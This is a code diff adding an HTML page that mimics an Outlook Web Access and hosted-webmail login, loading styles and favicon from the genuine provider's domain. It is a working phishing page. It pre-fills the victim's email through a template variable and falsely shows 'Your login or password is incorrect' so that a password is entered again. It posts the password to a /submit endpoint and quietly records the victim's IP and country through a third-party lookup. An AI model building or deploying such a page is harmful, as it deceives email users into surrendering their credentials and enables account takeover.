@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Outlook Web Access</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link
+      href="https://controlpanel.serverdata.net/Portal/bundles/styles/login/aduser?v=aYVpbT3dSk8Qr1L6kJULoB8yoTeQcXCaXqvpoKI5vmA1"
+      rel="stylesheet"
+    />
+	<link id="favicon-ico" rel="icon" href="https://controlpanel.serverdata.net/favicon.ico" sizes="any">
+    <style>
+      .wbk {
+        word-break: keep-all;
+      }
+      .p0 {
+        padding: 0;
+      }
+    </style>
+    <script>
+      function validateForm(event) {
+        const password = document.getElementById('aduser-login-passwordInput').value;
+        const incorrectDiv = document.getElementById('incorrect');
+        const errorDiv = document.getElementById('error');
+        const submitButton = document.getElementById('login-submit-btn');
+
+        if (password.trim() === "") {
+          event.preventDefault();
+          incorrectDiv.style.display = 'none';
+          errorDiv.style.display = 'block';
+          submitButton.disabled = false;
+
+          setTimeout(() => {
+            incorrectDiv.style.display = 'block';
+            errorDiv.style.display = 'none';
+          }, 7000);
+          return false;
+        }
+        submitButton.disabled = true;
+      }
+      
+    </script>
+</head>
+<body>
+    <section class="login-section">
+        <div class="login-logo"></div>
+        <h1 class="login-header">Welcome to your Webmail & Account Settings</h1>
+
+        <!-- Webmail & Services Tabs -->
+        <div class="login-tabs">
+            <button class="login-tab login-webmail selected">
+                Webmail
+                <i class="icon-info tooltip" title="Access email on the web using OWA"></i>
+            </button>
+            <button class="login-tab login-myservices">
+                My Services
+                <i class="icon-info tooltip" title="Change your password, request new services, and perform other basic user tasks"></i>
+            </button>
+        </div>
+
+        <!-- Form -->
+        <form method="POST" action="/submit" class="login-form" novalidate autocomplete="off" onsubmit="validateForm(event)">
+            <div>
+				<input type="hidden" name="ip" id="ip" value="" />
+				<input type="hidden" name="country" id="country" value="" />
+                <input
+                  name="login"
+                  id="aduser-login-loginInput"
+                  type="text"
+                  value="{{ username }}"
+                  placeholder="Login (email)"
+                  class="login-input"
+                  required
+                  readonly
+                />
+                <input
+                  name="password"
+                  id="aduser-login-passwordInput"
+                  type="password"
+                  placeholder="Password"
+                  class="password-input"
+                  required
+                  autofocus
+                />
+                <div class="password-validation required">Password required</div>
+                <!-- Incorrect Password Message -->
+                <div class="mixed-validation" style="display: block;" id="incorrect">
+                  Your login or password is incorrect.
+              </div>
+
+              <!-- Empty Password Error (Hidden by Default) -->
+              <div class="mixed-validation" style="display: none;" id="error">
+                  Password cannot be empty.
+              </div>
+
+                <!-- Remember Me and Forgot Password -->
+                <div class="login-actions">
+                    <label class="login-remember-me">
+                        <input type="checkbox" name="rememberMe" value="true" class="login-checkbox" />
+                        Remember me
+                    </label>
+                    <a href="javascript:void(0)" class="login-forgot-password">Forgot password?</a>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" id="login-submit-btn" class="login-submit wbk p0">Try Again</button>
+            </div>
+        </form>
+    </section>
+
+    <!-- Browser Update Message -->
+    <div id="oldBrowser" class="login-alert" style="display: none;">
+        <div class="login-alert-content">
+            <img
+              class="login-alert-icon m-24"
+              src="https://controlpanel.serverdata.net/Content/images/icons/24/warning-orange_24.png"
+              alt=""
+            />
+            <div class="login-alert-text">
+                <div class="d-tc">
+                    <i class="login-alert-icon-warning mr10 ml-10"></i>
+                </div>
+                <div class="d-tc">
+                    <p><strong>You’ll get more if you update your browser.</strong><br>
+                    Our layout and page behavior is optimized for the latest version of your browser.</p>
+                    <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
+                    <p class="mb0">This button will redirect you to your browser’s update page</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const ipField = document.getElementById('ip');
+          const countryField = document.getElementById('country');
+
+          if (ipField && countryField) {
+            ipField.value = data.ip || '127.0.0.1';
+            countryField.value = data.country_name || 'Localhost';
+          }
+        })
+        .catch(err => {
+          console.error('Error fetching IP data:', err);
+        });
+    </script>
+</body>
+</html>
